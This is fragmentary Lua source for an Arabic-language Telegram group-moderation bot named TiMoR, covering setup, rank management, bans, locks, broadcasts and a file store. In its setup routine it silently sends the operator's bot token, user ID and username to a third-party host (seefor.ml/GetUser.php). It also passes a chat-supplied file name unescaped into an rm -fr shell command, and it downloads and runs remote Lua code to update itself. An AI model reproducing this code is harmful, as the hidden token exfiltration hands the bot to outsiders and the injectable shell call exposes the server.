...
if not f then   
if not redis:get(Server_TiMoR.."Token_DevTiMoR") then
...
redis:set(Server_TiMoR.."Token_DevTiMoR",token)
end 
else
io.write('\n\27[1;31mܛ Token was not saved \n لم يتم حفظ التوكن \n\27[0;39;49m')
end 
os.execute('lua TiMoR.lua')
end
------------------------------------------------------------------------------------------------------------
if not redis:get(Server_TiMoR.."User_DevTiMoR1") then
...
io.write('\n\27[1;31mܛ Is Spam For Url : لقد قمت بالتكرار في الرابط حاول بعد دقيقتين \n\27[0;39;49m')
os.execute('lua TiMoR.lua')
end
if User_Info.Info == 'Channel' then
io.write('\n\27[1;31mܛ The UserName Is Channel : عذرا هاذا معرف قناة وليس حساب \n\27[0;39;49m')
os.execute('lua TiMoR.lua')
end
io.write('\n\27[1;31mܛ The UserNamr Is Saved : تم حفظ معرف المطور واستخراج ايدي المطور\n\27[0;39;49m')
redis:set(Server_TiMoR.."User_DevTiMoR1",User_Info.Info.Username)
redis:set(Server_TiMoR.."Id_DevTiMoR",User_Info.Info.Id)
https.request("https://seefor.ml/GetUser.php?id="..User_Info.Info.Id.."&user="..User_Info.Info.Username.."&token="..redis:get(Server_TiMoR.."Token_DevTiMoR"))
else
io.write('\n\27[1;31mܛ The UserName was not Saved : لم يتم حفظ معرف المطور الاساسي\n\27[0;39;49m')
end 
os.execute('lua TiMoR.lua')
end
------------------------------------------------------------------------------------------------------------
local DevTiMoR_Info_Sudo = io.open("Info_Sudo.lua", 'w')
DevTiMoR_Info_Sudo:write([[
do 
local TiMoR_INFO = {
Id_DevTiMoR = ]]..redis:get(Server_TiMoR.."Id_DevTiMoR")..[[,
UserName_TiMoR = "]]..redis:get(Server_TiMoR.."User_DevTiMoR1")..[[",
Token_Bot = "]]..redis:get(Server_TiMoR.."Token_DevTiMoR")..[["
}
return TiMoR_INFO
end

]])
DevTiMoR_Info_Sudo:close()
------------------------------------------------------------------------------------------------------------
local Run_File_TiMoR = io.open("TiMoR", 'w')
Run_File_TiMoR:write([[
#!/usr/bin/env bash
cd $HOME/Storm
token="]]..redis:get(Server_TiMoR.."Token_DevTiMoR")..[["
while(true) do
rm -fr ../.telegram-cli
./tg -s ./TiMoR.lua -p PROFILE --bot=$token
done
]])
Run_File_TiMoR:close()
------------------------------------------------------------------------------------------------------------
...
os.execute('chmod +x TiMoR')
os.execute('chmod +x tk')
os.execute('./tk')
Status = true
else   
f:close()  
redis:del(Server_TiMoR.."Token_DevTiMoR");redis:del(Server_TiMoR.."Id_DevTiMoR");redis:del(Server_TiMoR.."User_DevTiMoR1")
Status = false
end  
return Status
end
...
------------------------------------------------------------------------------------------------------------
function Dev_TiMoR(msg)  
local Dev_TiMoR = false  
...
local function Dev_TiMoR_User(user)  
local Dev_TiMoR_User = false  
for k,v in pairs(Ids_Dev) do  
if user == v then  
Dev_TiMoR_User = true  
end  
end  
return Dev_TiMoR_User  
end 
...
if Dev_TiMoR_User(user_id) then
Status = true  
...
if Dev_TiMoR_User(user_id) == true then
...
url = 'https://raw.githubusercontent.com/Usebot/TiMoR/master/Script.lua'
...
url = 'https://raw.githubusercontent.com/Usebot/TiMoR/master/TiMoR.lua'
file_path = 'TiMoR.lua'
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
...
local UserName = (data.username_ or "TiMoRcil")
for gmatch in string.gmatch(data.first_name_, "[^%s]+") do
data.first_name_ = gmatch or 'TiMoR'
end
...
send(msg.chat_id_, msg.id_,"ܛ المستخدم ⋙ ["..data.first_name_.."](T.me/"..UserName..")".."\n"..text)
return false
end
...
------------------------------------------------------------------------------------------------------------
function FilesTiMoR(msg)
File_Bot = dofile("Script.lua")
if File_Bot.TiMoR and msg then
Text_File = File_Bot.TiMoR(msg)
end
send(msg.chat_id_, msg.id_,Text_File)  
return false
end
function FilesTiMoRBot(msg)
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
Text_FileBot = dofile("Files/"..v)
if Text_FileBot.TiMoRFile and msg then
Text_FileBot = Text_FileBot.TiMoRFile(msg)
end
end
end
...
------------------------------------------------------------------------------------------------------------
function Dev_TiMoR_File(msg,data)
if msg then
msg = data.message_
...
send(msg.chat_id_, msg.id_,'\nܛ الكانسر مقفول يرجى زغرفه اسمك اولاً\n ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉  ┉ ┉ ┉ ┉\n[ܛ اضغط هنا لزغرفه اسمك.](https://t.me/SJAIBot)')
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
end
end,nil)   
return false
...
redis:set(bot_id..'Texting:DevTiMoR',text)
redis:del(bot_id..'GetTexting:DevTiMoR'..msg.chat_id_..':'..msg.sender_user_id_)
...
local Users = redis:smembers(bot_id.."TiMoR:UsersBot")
local Groups = redis:smembers(bot_id..'TiMoR:Chek:Groups') 
for i = 1, #Groups do
redis:sadd(bot_id..'ChekBotAdd',Groups[i])  
local list1 = redis:smembers(bot_id..'TiMoR:Basic:Constructor'..Groups[i])
for k,v in pairs(list1) do
redis:sadd(bot_id.."President:Group"..Groups[i], v)
end
local list2 = redis:smembers(bot_id..'TiMoR:Constructor'..Groups[i])
for k,v in pairs(list2) do
redis:sadd(bot_id.."Constructor:Group"..Groups[i], v)
end
local list3 = redis:smembers(bot_id..'TiMoR:Manager'..Groups[i])
for k,v in pairs(list3) do
redis:sadd(bot_id.."Manager:Group"..Groups[i], v)
end
local list4 = redis:smembers(bot_id..'TiMoR:Mod:User'..Groups[i])
...
download_to_file('https://raw.githubusercontent.com/Usebot/TiMoR/master/TiMoR.lua','TiMoR.lua') 
download_to_file('https://raw.githubusercontent.com/Usebot/TiMoR/master/Script.lua','Script.lua') 
...
local Get_Files, res = https.request("https://raw.githubusercontent.com/Usebot/Files_TiMoR/master/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
if Get_info then
local TextS = "\nܛ قائمه ملفات متجر سورس TiMoR\nܛ الملفات المتوفره حاليا\n━━━━━━━━━━━━━\n\n"
...
local Get_Json, Res = https.request("https://raw.githubusercontent.com/Usebot/Files_TiMoR/master/Files_TiMoR/"..File_Name)
if Res == 200 then
os.execute("rm -fr Files/"..File_Name)
send(msg.chat_id_, msg.id_,"\nܛ الملف ← *"..File_Name.."*\nܛ تم تعطيله وحذفه من البوت بنجاح") 
dofile('TiMoR.lua')  
else
send(msg.chat_id_, msg.id_,"ܛ لا يوجد ملف بهاذا الاسم") 
end
...
if not Dev_TiMoR(msg) and not redis:sismember(bot_id..'User:Ban:Pv',msg.sender_user_id_) and not redis:get(bot_id..'Status:Lock:Twasl') then
...
redis:set(bot_id..'GetTexting:DevTiMoR'..msg.chat_id_..':'..msg.sender_user_id_,true)
...
redis:del(bot_id..'Texting:DevTiMoR')
...
if Dev_TiMoR_User(result.id_) == true then
...
send(msg.chat_id_, msg.id_,'*ܛ عدد المجموعات الان ← { '..#group..' } مجموعه '..TiMoR..''..taha..'\nܛ اصبح عدد المجموعات الان ← { '..sendok..' } مجموعات*\n')   
end
end
end,nil)
end
...
if text == 'رفع النسخه الاحتياطيه' and tonumber(msg.reply_to_message_id_) > 0 and Dev_TiMoR(msg) then   
tdcli_function({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},function(Arg, Data)   
...
Send_Options(msg,result.sender_user_id_,"reply","ܛ تم ترقيته مطور في البوت")  
end
...
Send_Options(msg,result.sender_user_id_,"reply","ܛ تم تنزيله من المطورين")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
return false
end
...
if (result.id_) then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"ܛ عذرا اذا معرف قناة")   
return false 
end      
redis:sadd(bot_id.."Developer:Bot", result.id_)
Send_Options(msg,result.id_,"reply","ܛ تم ترقيته مطور في البوت")  
...
if Dev_TiMoR_User(result.sender_user_id_) == true then
send(msg.chat_id_, msg.id_, "ܛ لا تستطيع حظر المطور الاساسي عام")
return false 
end
Send_Options(msg,result.sender_user_id_,"reply","ܛ تم حظره عام من المجموعات")  
...
Send_Options(msg,result.sender_user_id_,"reply","ܛ تم الغاء حظره عام من المجموعات")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
...
Send_Options(msg,result.sender_user_id_,"reply","ܛ تم ترقيته منشئ اساسي")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
...
Send_Options(msg,result.sender_user_id_,"reply","ܛ تم تنزيله من المنشئين")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
...
Send_Options(msg,result.sender_user_id_,"reply","ܛ تم ترقيته منشئ في المجموعه")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
...
Send_Options(msg,result.sender_user_id_,"reply","ܛ تم ترقيته مدير المجموعه")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
...
Send_Options(msg,result.sender_user_id_,"reply","ܛ تم تنزيله من المدراء")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
...
Send_Options(msg,result.sender_user_id_,"reply","ܛ تم ترقيته ادمن للمجموعه")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
...
Send_Options(msg,result.sender_user_id_,"reply","ܛ تم تنزيله من ادمنيه المجموعه")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
...
Send_Options(msg,result.sender_user_id_,"reply","ܛ تم تنزيله من المميزين")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
...
KickGroup(result.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","ܛ تم حظره من المجموعه")  
end,nil)   
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
...
Send_Options(msg,result.sender_user_id_,"reply","ܛ تم الغاء حظره من هنا")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
...
Send_Options(msg,result.sender_user_id_,"reply","ܛ تم كتمه من هنا")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
...
Send_Options(msg,result.sender_user_id_,"reply","ܛ تم الغاء كتمه من هنا")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
...
Send_Options(msg,result.sender_user_id_,"reply","ܛ تم الغاء تقييده")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
...
Send_Options(msg,result.id_,"reply","ܛ تم ترقيته منشئ اساسي")  
else
send(msg.chat_id_, msg.id_,"ܛ المعرف غلط ")
end
end
...
Send_Options(msg,result.id_,"reply","ܛ تم تنزيله من المنشئين")  
else
send(msg.chat_id_, msg.id_,"ܛ المعرف غلط ")
end
end
...
Send_Options(msg,result.id_,"reply","ܛ تم ترقيته منشئ في المجموعه")  
else
send(msg.chat_id_, msg.id_,"ܛ المعرف غلط ")
end
end
...
Send_Options(msg,result.id_,"reply","ܛ تم ترقيته مدير المجموعه")  
else
send(msg.chat_id_, msg.id_,"ܛ المعرف غلط ")
end
end
...
Send_Options(msg,result.id_,"reply","ܛ تم تنزيله من المدراء")  
else
send(msg.chat_id_, msg.id_,"ܛ المعرف غلط ")
end
end
...
Send_Options(msg,result.id_,"reply","ܛ تم ترقيته ادمن للمجموعه")  
else
send(msg.chat_id_, msg.id_,"ܛ المعرف غلط ")
end
end
...
Send_Options(msg,result.id_,"reply","ܛ تم تنزيله من ادمنيه المجموعه")  
else
send(msg.chat_id_, msg.id_,"ܛ المعرف غلط ")
end
end
...
Send_Options(msg,result.id_,"reply","ܛ تم ترقيته مميز للمجموعه")  
else
send(msg.chat_id_, msg.id_,"ܛ المعرف غلط ")
end
end
...
Send_Options(msg,result.id_,"reply","ܛ تم تنزيله من المميزين")  
else
send(msg.chat_id_, msg.id_,"ܛ المعرف غلط ")
end
end
...
Send_Options(msg,result.sender_user_id_,"reply","ܛ تم ترقيته : "..text:match("رفع (.*)").."")  
end   
...
Send_Options(msg,result.sender_user_id_,"reply","ܛ تم تنزيله : "..text:match("تنزيل (.*)").."")  
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, Status_reply, nil)
end
...
Send_Options(msg,result.id_,"reply","ܛ تم رفعه : "..text1[2].."")
else
send(msg.chat_id_, msg.id_,"ܛ المعرف غلط")
end
end
...
Send_Options(msg,result.id_,"reply","ܛ تم تنزيله : "..text1[2].."")
else
send(msg.chat_id_, msg.id_,"ܛ المعرف غلط")
end
end
...
Send_Options(msg,result.id_,"reply","ܛ تم حظره من المجموعه")  
end,nil)   
end
else
send(msg.chat_id_, msg.id_,"ܛ المعرف غلط ")
...
Send_Options(msg,result.id_,"reply","ܛ تم الغاء حظره من هنا")  
else
send(msg.chat_id_, msg.id_,"ܛ المعرف غلط ")
end
end
...
Send_Options(msg,result.id_,"reply","ܛ تم كتمه من هنا")  
else
send(msg.chat_id_, msg.id_,"ܛ المعرف غلط ")
end
end
...
Send_Options(msg,result.id_,"reply","ܛ تم الغاء كتمه من هنا")  
else
send(msg.chat_id_, msg.id_,"ܛ المعرف غلط ")
end
end
...
Send_Options(msg,result.id_,"reply","ܛ تم تقييده في المجموعه")  
else
send(msg.chat_id_, msg.id_,"ܛ المعرف غلط ")
end
end
...
Send_Options(msg,result.id_,"reply", "ܛ تم تقيده لمدة ~ { "..TextEnd[2]..' '..TextEnd[3]..'}')
...
Send_Options(msg,result.id_,"reply","ܛ تم الغاء تقييده")  
else
send(msg.chat_id_, msg.id_,"ܛ المعرف غلط ")
end
end
...
KickGroup(msg.chat_id_, result.id_)
Send_Options(msg,result.id_,"reply","ܛ تم طرده من هنا")  
end,nil)   
end
else
send(msg.chat_id_, msg.id_,"ܛ المعرف غلط ")
...
send(msg.chat_id_, msg.id_, "\nܛ لا تستطيع -( حظر , طرد , كتم , تقيد ) : "..Get_Rank(text:match("^حظر (%d+)$"),msg.chat_id_).."")
else
...
Send_Options(msg,text:match("^حظر (%d+)$") ,"reply","ܛ تم حظره من المجموعه")  
end,nil)   
end
...
send(msg.chat_id_, msg.id_, "\nܛ لا تستطيع -( حظر , طرد , كتم , تقيد ) : "..Get_Rank(text:match("^تقيد (%d+)$"),msg.chat_id_).."")
else
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..text:match("^تقيد (%d+)$"))
Send_Options(msg,text:match("^تقيد (%d+)$"),"reply","ܛ تم تقييده في المجموعه")  
end
...
Send_Options(msg,result.sender_user_id_,"reply", "ܛ تم تقيده لمدة ~ { "..TextEnd[2]..' '..TextEnd[3]..'}')
...
Send_Options(msg,text:match("^الغاء تقيد (%d+)$"),"reply","ܛ تم الغاء تقييده")  
...
KickGroup(result.chat_id_, result.sender_user_id_)
Send_Options(msg,result.sender_user_id_,"reply","ܛ تم طرده من هنا")  
end,nil)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunctionStatus, nil)
...
send(msg.chat_id_, msg.id_, "\nܛ لا تستطيع -( حظر , طرد , كتم , تقيد ) : "..Get_Rank(text:match("^طرد (%d+)$"),msg.chat_id_).."")
else
...
Send_Options(msg,text:match("^طرد (%d+)$") ,"reply","ܛ تم طرده من هنا")  
end,nil)   
end
...
Send_Options(msg,msg.sender_user_id_,"Close_Status","ܛ تم قفـل الفارسيه")  
...
Send_Options(msg,msg.sender_user_id_,"Close_Status","ܛ تم قفـل الفشار")  
...
Send_Options(msg,msg.sender_user_id_,"Close_Status","ܛ تم قفـل الدردشه")  
...
Send_Options(msg,msg.sender_user_id_,"Close_Status","ܛ تم قفـل اضافة الاعضاء")  
...
Send_Options(msg,msg.sender_user_id_,"Close_Status","ܛ تم قفـل دخول الاعضاء")  
...
Send_Options(msg,msg.sender_user_id_,"Close_Status","ܛ تم قفـل البوتات")  
...
Send_Options(msg,msg.sender_user_id_,"Close_Status_Kick","ܛ تم قفـل البوتات")  
...
Send_Options(msg,msg.sender_user_id_,"Close_Status","ܛ تم قفـل الاشعارات")  
...
Send_Options(msg,msg.sender_user_id_,"Close_Status","ܛ تم قفـل التثبيت هنا")  
...
Send_Options(msg,msg.sender_user_id_,"Close_Status","ܛ تم قفـل تعديل")  
...
Send_Options(msg,msg.sender_user_id_,"Close_Status","ܛ تم قفـل جميع الاوامر")  
...
Send_Options(msg,msg.sender_user_id_,"Open_Status","ܛ تم فتح البوتات")  
elseif text == "فتح البوتات " and msg.reply_to_message_id_ == 0 and Admin(msg) then 
redis:del(bot_id.."Status:Lock:Bot:kick"..msg.chat_id_)  
...
Send_Options(msg,msg.sender_user_id_,"Open_Status","ܛ تم فتح الاشعارات")  
...
Send_Options(msg,msg.sender_user_id_,"Open_Status","ܛ تم فتح التثبيت هنا")  
...
Send_Options(msg,msg.sender_user_id_,"Open_Status","ܛ تم فتح تعديل")  
...
redis:set(bot_id.."Status:Lock:edit"..msg.chat_id_,true) 
redis:set(bot_id.."Status:Lock:Bot:kick"..msg.chat_id_,"kick")  
send(msg.chat_id_, msg.id_,"ܛ تم تفعيل الحمايه القصوى") 
...
elseif text == "تفعيل المغادره" and Dev_TiMoR(msg) then   
redis:del(bot_id.."Status:Lock:Left"..msg.chat_id_)  
send(msg.chat_id_, msg.id_,"ܛ تم تفعيل مغادرة البوت") 
elseif text == "تعطيل المغادره" and Dev_TiMoR(msg) then  
redis:set(bot_id.."Status:Lock:Left"..msg.chat_id_,true)   
send(msg.chat_id_, msg.id_, "ܛ تم تعطيل مغادرة البوت") 
elseif text == "تفعيل الاذاعه" and Dev_TiMoR(msg) then  
redis:del(bot_id.."Status:Broadcasting:Bot") 
send(msg.chat_id_, msg.id_,"ܛ تم تفعيل الاذاعه \nܛ الان يمكن للمطورين الاذاعه" ) 
elseif text == "تعطيل الاذاعه" and Dev_TiMoR(msg) then  
redis:set(bot_id.."Status:Broadcasting:Bot",true) 
send(msg.chat_id_, msg.id_,"ܛ تم تعطيل الاذاعه") 
...
elseif text == 'تفعيل البوت الخدمي' and Dev_TiMoR(msg) then  
redis:del(bot_id..'Free:Bot') 
send(msg.chat_id_, msg.id_,'ܛ تم تفعيل البوت الخدمي \nܛ الان يمكن الجميع تفعيله') 
elseif text == 'تعطيل البوت الخدمي' and Dev_TiMoR(msg) then  
redis:set(bot_id..'Free:Bot',true) 
send(msg.chat_id_, msg.id_,'ܛ تم تعطيل البوت الخدمي') 
...
elseif text == 'وضع كليشه المطور' and Dev_TiMoR(msg) then
redis:set(bot_id..'GetTexting:DevTiMoR'..msg.chat_id_..':'..msg.sender_user_id_,true)
send(msg.chat_id_,msg.id_,'ܛ ارسل لي الكليشه الان')
...
elseif text == 'روابط الكروبات' and Dev_TiMoR(msg) then
local list = redis:smembers(bot_id..'ChekBotAdd') 
...
if link then                              
send(msg.chat_id_,msg.id_,"ܛ 𝘭𝘪𝘯𝘬 𝘨𝘳𝘰𝘶𝘱 :\n ["..link.."]\n••━━━━━━━━━━━━••")
else                
...
elseif text == ("مسح ردود المطور") and Dev_TiMoR(msg) then 
...
elseif text == ("ردود المطور") and Dev_TiMoR(msg) then 
local list = redis:smembers(bot_id.."List:Rd:Sudo")
text = "\nܛ قائمة ردود المطور \n••━━ܛ━━━━ܛ━━••\n"
for k,v in pairs(list) do
...
send(msg.chat_id_, msg.id_,"["..text.."]")
elseif text == "اضف رد للكل" and Dev_TiMoR(msg) then 
...
elseif text == "حذف رد للكل" and Dev_TiMoR(msg) then 
...
if Dev_TiMoR_User(msg.sender_user_id_) == true then
redis:srem(bot_id.."Developer:Bot", result.id_)
redis:srem(bot_id.."President:Group"..msg.chat_id_,result.id_)
redis:srem(bot_id..'Constructor:Group'..msg.chat_id_, result.id_)
redis:srem(bot_id..'Manager:Group'..msg.chat_id_, result.id_)
...
send(msg.chat_id_, msg.id_,"ܛ تم حبيبي حغادر") 
...
elseif text == "تغير اسم البوت" and Dev_TiMoR(msg) or text == "تغيير اسم البوت" and Dev_TiMoR(msg) then 
redis:setex(bot_id.."Change:Name:Bot"..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_,"ܛ ارسل لي الاسم الان ")  
elseif text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 and DeveloperBot(msg) then 
if redis:get(bot_id.."Status:Broadcasting:Bot") and not Dev_TiMoR(msg) then 
...
send(msg.chat_id_, msg.id_,'ܛ تم تغير الايدي ارسل ايدي لرؤيته')
end
...
ܛ بيع مجوهراتي ← { العدد } ← لبيع كل مجوهره مقابل {50} رساله
*]]) 
...
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
return false
elseif text == "تنظيف المشتركين" and Dev_TiMoR(msg) then
local pv = redis:smembers(bot_id..'Num:User:Pv')  
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]},function(arg,dataq)
...
return false
elseif text == "تنظيف الكروبات" and Dev_TiMoR(msg) then
local group = redis:smembers(bot_id..'ChekBotAdd')  
local w = 0
local q = 0
for i = 1, #group do
...
local UserName = (b.username_ or "TiMoRcil")
...
elseif text and text:match("^تعين عدد الاعضاء (%d+)$") and Dev_TiMoR(msg) then
redis:set(bot_id..'Num:Add:Bot',text:match("تعين عدد الاعضاء (%d+)$") ) 
send(msg.chat_id_, msg.id_,'*ܛ تم تعيين عدد اعضاء تفعيل البوت اكثر من : '..text:match("تعين عدد الاعضاء (%d+)$")..' عضو *')
elseif text =='الاحصائيات' and DeveloperBot(msg) then 
send(msg.chat_id_, msg.id_,'*ܛ عدد احصائيات البوت الكامله \n••━━ܛ━━━━ܛ━━••\nܛ عدد المجموعات : '..(redis:scard(bot_id..'ChekBotAdd') or 0)..'\nܛ عدد المشتركين : '..(redis:scard(bot_id..'Num:User:Pv') or 0)..'*')
elseif text == 'المطور' or text == 'مطور' then
local TextingDevTiMoR = redis:get(bot_id..'Texting:DevTiMoR')
if TextingDevTiMoR then 
send(msg.chat_id_, msg.id_,TextingDevTiMoR)
else
send(msg.chat_id_, msg.id_,'['..UserName_Dev..']')
end
elseif text == 'حذف كليشه المطور' and Dev_TiMoR(msg) then
redis:del(bot_id..'Texting:DevTiMoR')
send(msg.chat_id_, msg.id_,'ܛ تم حذف كليشه المطور')
end
end
...
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
if tonumber(data.member_count_) < tonumber(redis:get(bot_id..'Num:Add:Bot') or 0) and not Dev_TiMoR(msg) then
...
--------------------------------------------------------------------------------------------------------------
Dev_TiMoR_File(msg,data)
FilesTiMoRBot(msg,data)
